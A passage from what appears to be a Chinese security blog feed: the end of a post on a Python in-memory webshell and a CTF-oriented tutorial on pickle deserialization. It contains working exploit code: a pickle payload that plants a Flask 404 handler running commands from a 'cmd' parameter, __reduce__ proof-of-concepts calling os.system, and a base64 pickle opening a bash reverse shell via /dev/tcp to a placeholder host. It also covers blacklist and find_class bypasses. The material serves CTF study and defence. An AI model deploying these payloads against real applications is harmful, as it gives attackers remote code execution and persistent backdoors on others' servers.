<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">exec</span>,(<span class="string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()&quot;</span>,)</span><br><span class="line"></span><br><span class="line">c=A()</span><br><span class="line">poc = pickle.dumps(c)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(poc))</span><br></pre></td></tr></table></figure>





<p>参考文章：<br><code>https://xz.aliyun.com/t/14421?time__1311=mqmx9QD%3D0%3Di%3DLx05DIYYIp6x02njKDuG%3DoD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F</code></p>
<p><code>https://www.cnblogs.com/gxngxngxn/p/18181936</code></p>
]]></content>
      <categories>
        <category>Python漏洞</category>
        <category>python内存马分析</category>
      </categories>
  </entry>
  <entry>
    <title>pickle反序列化</title>
    <url>/2024/05/09/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h1><p>本篇文章用于简单入门，pickle反序列化危害性大，可以直接RCE</p>
<span id="more"></span>

<h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><h4 id="pickle简介"><a href="#pickle简介" class="headerlink" title="pickle简介"></a>pickle简介</h4><ul>
<li><strong>与PHP类似，python也有序列化功能以长期储存内存中的数据</strong>。<u>pickle是python下的序列化与反序列化包。</u></li>
<li>Python有另一个更原始的序列化包marshal，marshal存在主要是为了支持Python的<code>.pyc</code>文件,现在开发时一般使用pickle。</li>
<li>与json相比，pickle以二进制储存，不易于人工阅读；json可以跨语言，而pickle是python专用的。<strong>pickle能表示python几乎所有的类型（包括自定义类型）</strong>，json只能表示一部分内置类型且不能表示自定义类型。</li>
<li><strong>pickle实际上可以看作一种独立的语言，通过对opcode的更改编写可以执行python代码、覆盖变量等操作</strong>。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）</li>
</ul>
<p><em>目前，pickle有6种版本</em></p>
<h4 id="可序列化的对象"><a href="#可序列化的对象" class="headerlink" title="可序列化的对象"></a>可序列化的对象</h4><ul>
<li>None、True和False</li>
<li>整数、浮点数、复数</li>
<li>str、byte、bytearray</li>
<li>只包含可封存对象的集合，包括tuple、list、set和dict</li>
<li>定义在模块最外层的函数（使用def定义，lambda函数则不可以）</li>
<li>定义在模块最外层的内置函数</li>
<li>定义在模块最外层的类</li>
<li><code>__dict__</code> 属性值或 <code>__getstate__()</code> 函数的返回值可以被序列化的类</li>
</ul>
<h4 id="pickle模块部分说明"><a href="#pickle模块部分说明" class="headerlink" title="pickle模块部分说明"></a>pickle模块部分说明</h4><p>pickle模块常用的方法有：dumps、loads、dump、load</p>
<h5 id="pickle-dumps-obj"><a href="#pickle-dumps-obj" class="headerlink" title="pickle.dumps(obj)"></a>pickle.dumps(obj)</h5><ul>
<li><p><code>pickle.dumps()</code> 函数可以只接受两个参数：<strong>要序列化的对象和一个可选的 <code>protocol</code> 参数</strong>，<u>后者指定了 pickle 的协议版本,</u><code>pickle</code> 模块支持多个协议版本，<strong>从版本0到版本5</strong>。每个版本的协议都有不同的序列化格式，其中版本越高，序列化后的数据通常更为紧凑和高效。</p>
</li>
<li><p><strong>在 <code>pickle</code> 模块中，如果该项省略，则默认为0，<code>protocol</code> 参数如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。所以可以自定义版本，如下代码，不定义就是默认的</strong></p>
</li>
<li><p>含义：把obj对象序列化后以bytes对象返回，不写入文件</p>
</li>
</ul>
<p>例如如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">a=&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;bob&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;boy&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;pickle版本<span class="subst">&#123;i&#125;</span>&#x27;</span>,pickle.dumps(a,protocol=i))</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">pickle版本<span class="number">0</span> <span class="string">b&#x27;(dp0\nVname\np1\nVbob\np2\nsVsex\np3\nVboy\np4\ns.&#x27;</span></span><br><span class="line">pickle版本<span class="number">1</span> <span class="string">b&#x27;&#125;q\x00(X\x04\x00\x00\x00nameq\x01X\x03\x00\x00\x00bobq\x02X\x03\x00\x00\x00sexq\x03X\x03\x00\x00\x00boyq\x04u.&#x27;</span></span><br><span class="line">pickle版本<span class="number">2</span> <span class="string">b&#x27;\x80\x02&#125;q\x00(X\x04\x00\x00\x00nameq\x01X\x03\x00\x00\x00bobq\x02X\x03\x00\x00\x00sexq\x03X\x03\x00\x00\x00boyq\x04u.&#x27;</span></span><br><span class="line">pickle版本<span class="number">3</span> <span class="string">b&#x27;\x80\x03&#125;q\x00(X\x04\x00\x00\x00nameq\x01X\x03\x00\x00\x00bobq\x02X\x03\x00\x00\x00sexq\x03X\x03\x00\x00\x00boyq\x04u.&#x27;</span></span><br></pre></td></tr></table></figure>

<p>可以看出不同的pickle版本有序列化出来的值不同。</p>
<h5 id="pickle-loads-bytes-object"><a href="#pickle-loads-bytes-object" class="headerlink" title="pickle.loads(bytes_object)"></a>pickle.loads(bytes_object)</h5><p><strong>注意</strong>：Pickle 协议版本是自动检测出来的，所以不需要参数来指定协议。</p>
<p><strong>含义</strong>：从bytes对象中读取一个反序列化对象，并返回其重组后的对象且特殊情况下可以返回基本类型</p>
<p>如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">a=&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;bob&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;boy&#x27;</span>&#125;</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">d=pickle.loads(c)</span><br><span class="line"><span class="built_in">print</span>(d,<span class="built_in">type</span>(d))</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="string">b&#x27;\x80\x04\x95\x1e\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x04name\x94\x8c\x03bob\x94\x8c\x03sex\x94\x8c\x03boy\x94u.&#x27;</span></span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;bob&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;boy&#x27;</span>&#125; &lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>

<h5 id="pickle-dump-obj-file"><a href="#pickle-dump-obj-file" class="headerlink" title="pickle.dump(obj,file)"></a>pickle.dump(obj,file)</h5><p><strong>含义</strong>：序列化对象，并将数据流写入到文件对象中</p>
<p>由于要写入到一个文件中，故至少有两个参数，同样可以自定义pickle版本。</p>
<p>注意：使用这个就需要调用open函数来调用一个文件对象，格式如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">a=&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;bob&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;boy&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./data.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f :</span><br><span class="line">    pickle.dump(a,f)</span><br></pre></td></tr></table></figure>

<p>序列化后后打开data.txt</p>
<p><img src="/2024/05/09/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240506174804669.png" alt="image-20240506174804669"></p>
<p>确实写入了不可读的数据</p>
<h5 id="pickle-load-file"><a href="#pickle-load-file" class="headerlink" title="pickle.load(file)"></a>pickle.load(file)</h5><p><strong>含义：</strong>反序列化对象，将文件中的数据解析为一个python对象</p>
<p><strong>注意</strong>：Pickle 协议版本是自动检测出来的，所以不需要参数来指定协议。</p>
<p>接上个板块，代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> b:</span><br><span class="line">    <span class="built_in">print</span>(pickle.load(b))</span><br><span class="line">输出：</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;bob&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;boy&#x27;</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看出确实成功读出来了。</p>
<h2 id="pickle过程详细解读"><a href="#pickle过程详细解读" class="headerlink" title="pickle过程详细解读"></a>pickle过程详细解读</h2><ul>
<li>pickle解析依靠Pickle Virtual Machine(PVM)进行</li>
<li>PVM涉及到三个部分：1.解析引擎 2.栈 3.内存</li>
<li>解析引擎：从流中读取opcode和参数，并对其进行解释处理。重复这个动作，知道遇到<code>.</code>为止。最终留在栈顶的值将被作为反序列化对象返回。</li>
<li>栈：由Python的list实现，被用来临时存储数据、参数以及对象。</li>
<li>memo：有Python的dict实现，为PVM的生命周期提供存储。其实就是将反序列化后的数据以<code>key-balue</code>的形式储存在memo中，以便后来使用</li>
</ul>
<h2 id="opcode简介"><a href="#opcode简介" class="headerlink" title="opcode简介"></a>opcode简介</h2><h4 id="opcode版本"><a href="#opcode版本" class="headerlink" title="opcode版本"></a>opcode版本</h4><p>当对传入的数据进行过滤的时候就需要考虑用到opcode。</p>
<p>pickle由于有不同的实现版本，在Py3和py2中得到的opcode不相同。但是pickle可以向下兼容（所以用v0就可以在所有版本中执行）。目前，pickle有6种版本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">a=&#123;<span class="string">&#x27;1&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;2&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;# 原变量：<span class="subst">&#123;a!r&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;pickle版本<span class="subst">&#123;i&#125;</span>&#x27;</span>,pickle.dumps(a,protocol=i))</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"></span><br><span class="line"><span class="comment"># 原变量：&#123;&#x27;1&#x27;: 1, &#x27;2&#x27;: 2&#125;</span></span><br><span class="line">pickle版本<span class="number">0</span> <span class="string">b&#x27;(dp0\nV1\np1\nI1\nsV2\np2\nI2\ns.&#x27;</span></span><br><span class="line">pickle版本<span class="number">1</span> <span class="string">b&#x27;&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br><span class="line">pickle版本<span class="number">2</span> <span class="string">b&#x27;\x80\x02&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br><span class="line">pickle版本<span class="number">3</span> <span class="string">b&#x27;\x80\x03&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br></pre></td></tr></table></figure>

<p>pickle3版本的opcode示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># &#x27;abcd&#x27;</span></span><br><span class="line"><span class="string">b&#x27;\x80\x03X\x04\x00\x00\x00abcdq\x00.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># \x80：协议头声明 \x03：协议版本</span></span><br><span class="line"><span class="comment"># \x04\x00\x00\x00：数据长度：4</span></span><br><span class="line"><span class="comment"># abcd：数据</span></span><br><span class="line"><span class="comment"># q：储存栈顶的字符串长度：一个字节（即\x00）</span></span><br><span class="line"><span class="comment"># \x00：栈顶位置</span></span><br><span class="line"><span class="comment"># .：数据截止</span></span><br></pre></td></tr></table></figure>

<h4 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h4><p>使用pickletools可以方便的将opcode转化为便于肉眼读取的形式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">data=<span class="string">b&#x27;\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00\x8c\x02nt\x94\x8c\x06system\x94\x93\x94\x8c\x04ls /\x94\x85\x94R\x94.&#x27;</span></span><br><span class="line">pickletools.dis(data)</span><br><span class="line"></span><br><span class="line">   <span class="number">0</span>: \x80 PROTO      <span class="number">4</span></span><br><span class="line">    <span class="number">2</span>: \x95 FRAME      <span class="number">28</span></span><br><span class="line">   <span class="number">11</span>: \x8c SHORT_BINUNICODE <span class="string">&#x27;nt&#x27;</span></span><br><span class="line">   <span class="number">15</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">0</span>)</span><br><span class="line">   <span class="number">16</span>: \x8c SHORT_BINUNICODE <span class="string">&#x27;system&#x27;</span></span><br><span class="line">   <span class="number">24</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">1</span>)</span><br><span class="line">   <span class="number">25</span>: \x93 STACK_GLOBAL</span><br><span class="line">   <span class="number">26</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">2</span>)</span><br><span class="line">   <span class="number">27</span>: \x8c SHORT_BINUNICODE <span class="string">&#x27;ls /&#x27;</span></span><br><span class="line">   <span class="number">33</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">3</span>)</span><br><span class="line">   <span class="number">34</span>: \x85 TUPLE1</span><br><span class="line">   <span class="number">35</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">4</span>)</span><br><span class="line">   <span class="number">36</span>: R    REDUCE</span><br><span class="line">   <span class="number">37</span>: \x94 MEMOIZE    (<span class="keyword">as</span> <span class="number">5</span>)</span><br><span class="line">   <span class="number">38</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="Unpickler-find-class-函数"><a href="#Unpickler-find-class-函数" class="headerlink" title="Unpickler.find_class()函数"></a><code>Unpickler.find_class()函数</code></h3><p>官方针对pickle的安全问题的建议是修改<code>find_class()</code>，引入白名单的方式来解决，很多CTF题都是针对该函数进行，所以搞清楚如何绕过该函数很重要。<br> <strong>什么时候会调用<code>find_class()</code>：</strong></p>
<ol>
<li>从opcode角度看，当出现<code>c</code>、<code>i</code>、<code>b&#39;\x93&#39;</code>时，会调用，所以只要在这三个opcode直接引入模块时没有违反规则即可。</li>
<li>从python代码来看，<code>find_class()</code>只会在解析opcode时调用一次，所以只要绕过opcode执行过程，<code>find_class()</code>就不会再调用，也就是说<code>find_class()</code>只需要过一次，通过之后再产生的函数在黑名单中也不会拦截，所以可以通过<code>__import__</code>绕过一些黑名单。</li>
</ol>
<p>看下面两个例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">safe_builtins = &#123;<span class="string">&#x27;range&#x27;</span>,<span class="string">&#x27;complex&#x27;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;frozenset&#x27;</span>,<span class="string">&#x27;slice&#x27;</span>,&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">in</span> safe_builtins:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %(module, name))</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&#x27;__main__&#x27;</span>: <span class="comment"># 只允许__main__模块</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[<span class="string">&#x27;__main__&#x27;</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br></pre></td></tr></table></figure>

<ul>
<li>第一个例子是官方文档中的例子，使用白名单限制了能够调用的模块为<code>&#123;&#39;range&#39;,&#39;complex&#39;,&#39;set&#39;,&#39;frozenset&#39;,&#39;slice&#39;,&#125;</code>。</li>
<li>第二个例子是高校战疫网络安全分享赛·webtmp中的过滤方法，只允许<code>__main__</code>模块。虽然看起来很安全，但是被引入主程序的模块都可以通过<code>__main__</code>调用修改，所以造成了变量覆盖。</li>
</ul>
<p>————————</p>
<h3 id="经典的-reduce-方法"><a href="#经典的-reduce-方法" class="headerlink" title="经典的__reduce__方法"></a><code>经典的__reduce__方法</code></h3><p>现在基本用不了，容易被ban。它的指令码是<code>R</code>。</p>
<ul>
<li>在利用时，可以通过重写类的<code>object.__reduce__()</code>函数，使之在被序列化时按照重写的方式进行。具体而言，python要求<code>object.__reduce__()</code> 返回一个 <code>(callable, ([para1,para2...])[,...])</code> 的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。</li>
<li>在下文pickle的opcode中， <code>R</code> 的作用与 <code>object.__reduce__()</code> 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（<strong>第二个对象必须为元组</strong>,否则其他返回值也无法利用），然后调用该函数。</li>
</ul>
<p>所以一种很流行的攻击思路是：利用<code>__reduce__</code>构造恶意字符串，当这个字符串被反序列化的时候，<code>__reduce__</code>会被执行。</p>
<p><u><strong>总结</strong>这里<code>__reduce__</code>魔术方法的作用</u>：</p>
<p>其实上面描述已经比较清楚了，<strong>在Python中<code>__reduce__</code>方法是一个特殊的方法，用于控制对象的序列化和反序列化过程。</strong><u>当一个对象被序列化时，<code>pickle</code>模块会调用该对象的<code>__reduce__</code>方法，以获取一个描述如何反序列化该对象的元组</u>，同时，<strong>当对象被反序列化时，<code>pickle</code>模块会调用该元组中的可调用对象，并将其余元素作为参数传递给改可调用对象</strong>。</p>
<p>所以当我传入的按照我设置的格式进行pickle序列化后生成的字符串，在被反序列化时，它将按照我定义的<code>__reduce__</code>方法来反序列化；因此，重写<code>__reduce__</code>方法可以让我们控制对象在反序列化时的行为，并在CTF环境中执行任意代码。</p>
<p>——————</p>
<h3 id="简单的exp"><a href="#简单的exp" class="headerlink" title="简单的exp"></a>简单的exp</h3><p>漏洞利用简略思路：</p>
<ul>
<li>任意代码执行或命令执行。</li>
<li>变量覆盖，通过覆盖一些凭证达到绕过身份验证的目的</li>
</ul>
<p><strong>注意</strong>：pickle序列化的结果可能与从操作系统有关，使用windows构建的payload可能不能在linux上运行。</p>
<h5 id="命令执行："><a href="#命令执行：" class="headerlink" title="命令执行："></a>命令执行：</h5><h6 id="当环境有os模块时"><a href="#当环境有os模块时" class="headerlink" title="当环境有os模块时"></a>当环境有os模块时</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">genpoc</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;ls /&quot;&quot;&quot;</span>  <span class="comment"># 要执行的命令</span></span><br><span class="line">        <span class="keyword">return</span> os.system, (s,)        <span class="comment"># reduce函数必须返回元组或字符串</span></span><br><span class="line">        <span class="comment">#或者直接return os.system,(&quot;ls /&quot;,)</span></span><br><span class="line"></span><br><span class="line">e = genpoc()</span><br><span class="line">poc = pickle.dumps(e)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(poc) <span class="comment"># 此时，如果 pickle.loads(poc)，就会执行命令</span></span><br></pre></td></tr></table></figure>

<p>成功执行：</p>
<p><img src="/2024/05/09/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20240509003635408.png" alt="image-20240509003635408"></p>
<p><strong>稍微解析一下这串代码：</strong></p>
<ol>
<li>导入pickle、os模块</li>
<li>定义了一个继承自object类的genpoc类。<strong>这是python中的常见做法，以确保类的行为符合预期</strong></li>
<li>在<code>genpoc</code>类内部，你重写了<code>__reduce__</code>方法。<strong>这个方法由<code>pickle</code>模块用来确定如何序列化和反序列化一个对象。</strong></li>
<li>在<code>__reduce__</code>方法内部，你定义了一个命令<code>echo test &gt; poc.txt</code>。当执行这个命令时，它会创建一个名为<code>poc.txt</code>的文件，内容为<code>test</code>。</li>
<li>从<code>__reduce__</code>方法<strong>返回了一个元组<code>(os.system,(s,))</code>。</strong><u>这告诉pickle模块在解Pickle对象时调用<code>os.system</code>和命令<code>s</code></u>。这种特定格式的原因是**<code>__reduce__</code>方法必须返回一个元组或字符串**（由于元组才有用所以基本都是利用元组）。元组的第一个元素是一个可调用的对象（在这种情况下时<code>os.system</code>），其余元素是该可调用对象的参数。</li>
<li>最后创建了一个<code>genpoc</code>类的实例<code>e</code>，然后使用<code>pickle.dumps(e)</code>对其进行了pickle。这创建了一个对象的序列化表示，可以稍后解pickle以执行命令</li>
</ol>
<p><strong>其他个人困惑解析：</strong></p>
<p><u>1.为什么这里的参数为<code>(s,)</code>这种格式，其中的逗号起什么作用</u>：</p>
<p>解析：在python中，元组是一种不可变的序列类型，用于存储一系列项目。<strong>元组中的项目用逗号分隔，并且整个元组被括号包围</strong>，在这个脚本中，<code>(s,)</code>是一个只包含一个元素的元组。逗号在这里起着非常重要的作用，<strong>因为它是区分元组和单个表达式的关键</strong>。</p>
<p>如果只写<code>(s)</code>，python会将其识别为一个单独的表达式，而不是包含一个元素的元组。因此，在这个脚本中，<code>(s,)</code>是一个包含一个元素的元组，该元素是要执行的命令。当<code>os.system</code>被调用时，它会将这个元组作为参数，从而执行命令。</p>
<h6 id="当环境没有os模块（常用）"><a href="#当环境没有os模块（常用）" class="headerlink" title="当环境没有os模块（常用）"></a>当环境没有os模块（常用）</h6><p>就需要生成一个让环境执行引入os模块的指令：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">haha</span>():</span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&#x27;&#x27;&#x27;__import__(&quot;os&quot;).popen(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxxxx/2333 0&gt;&amp;1&#x27;&quot;).read()&#x27;&#x27;&#x27;</span>,))</span><br><span class="line"><span class="comment">#&#x27;&#x27;&#x27;改为&quot;也行具体个人用，不是固定的</span></span><br><span class="line">a = haha()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a))</span><br><span class="line"><span class="comment"># b&#x27;gASVcgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxWX19pbXBvcnRfXygib3MiKS5wb3BlbigiYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMTAuNDEuMTcuMTgzLzIzMzMgMD4mMSciKS5yZWFkKCmUhZRSlC4=&#x27;</span></span><br></pre></td></tr></table></figure>

<p>最好所有的poc在Linux上生成</p>
<h5 id="变量覆盖："><a href="#变量覆盖：" class="headerlink" title="变量覆盖："></a>变量覆盖：</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">a = <span class="string">b&#x27;321&#x27;</span></span><br><span class="line">c = <span class="string">b&#x27;123&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>,(<span class="string">&quot;key1=b&#x27;1&#x27;\nkey2=b&#x27;2&#x27;&quot;</span>,))</span><br><span class="line"></span><br><span class="line">a = A()</span><br><span class="line">pickle_a = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(pickle_a)</span><br><span class="line">pickle.loads(pickle_a)</span><br><span class="line"><span class="built_in">print</span>(key1, key2)</span><br></pre></td></tr></table></figure>

<p>上面的两个方法使用的<code>__reduce__方法</code>其实就是对应的opcode中的R指令。</p>
<h3 id="绕过手法"><a href="#绕过手法" class="headerlink" title="绕过手法"></a>绕过手法</h3><h4 id="简单的利用以及绕过"><a href="#简单的利用以及绕过" class="headerlink" title="简单的利用以及绕过"></a>简单的利用以及绕过</h4><h6 id="函数过滤"><a href="#函数过滤" class="headerlink" title="函数过滤"></a>函数过滤</h6><p>有一种过滤方式：不禁止<code>R</code>指令码，但是对<code>R</code>执行的函数有黑名单限制</p>
<p>比如2018-XCTF-HITB-WEB : Python’s-Revenge。给了很长一串黑名单：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">black_type_list = [<span class="built_in">eval</span>, execfile, <span class="built_in">compile</span>, <span class="built_in">open</span>, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.<span class="built_in">open</span>, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.<span class="built_in">open</span>, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.<span class="built_in">open</span>, posixfile.fileopen]</span><br></pre></td></tr></table></figure>

<p> 但是这里**platform.popen()**不在名单里，它可以做到类似<code>system</code>的功能（想要利用应该还是需要<code>import platform</code>）。</p>
<p>另外，还有可以<strong>利用map()函数</strong>来干这件事：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line"> 	<span class="keyword">return</span> <span class="built_in">map</span>,(os.system,[<span class="string">&quot;ls&quot;</span>])</span><br></pre></td></tr></table></figure>

<p> 总之，黑名单不可取，如果禁止掉<code>R</code>这个指令码，那么reduce这一套方法都不能再使用。</p>
<h6 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h6><p>与命令执行相关的opcode有三个：<code>R</code>、<code>i</code>、<code>o</code>，所以我们可以从三个方向进行构造。（测试了一下，下面的几种指令都能用），还可以使用<code>b</code>，看后面的稍难过滤</p>
